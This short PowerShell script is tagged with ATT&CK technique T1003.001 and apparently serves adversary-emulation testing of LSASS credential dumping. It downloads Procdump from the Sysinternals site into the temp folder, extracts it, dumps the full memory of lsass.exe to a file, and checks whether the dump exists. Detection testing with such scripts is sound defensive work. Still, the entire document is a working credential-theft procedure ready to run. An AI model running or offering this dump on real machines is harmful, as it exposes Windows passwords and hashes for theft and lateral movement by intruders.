<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    Dumping lsass process using procdump from sysinternals tools
#>

$dmpPath = "$env:TEMP\lsass.dmp"

#Download Procdump
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"

#Extract Procdump
Expand-Archive -Path "$env:TEMP\Procdump.zip" -DestinationPath "$env:TEMP"

#Dump lsass process
& "$env:TEMP\procdump.exe" -accepteula -ma lsass.exe $dmpPath 


if (Test-Path $dmpPath) {
    Write-Host "Lsass dumped, $dmpPath has been created successfully"
} else {
    Write-Host "Error: $dmpPath has not been created"
}
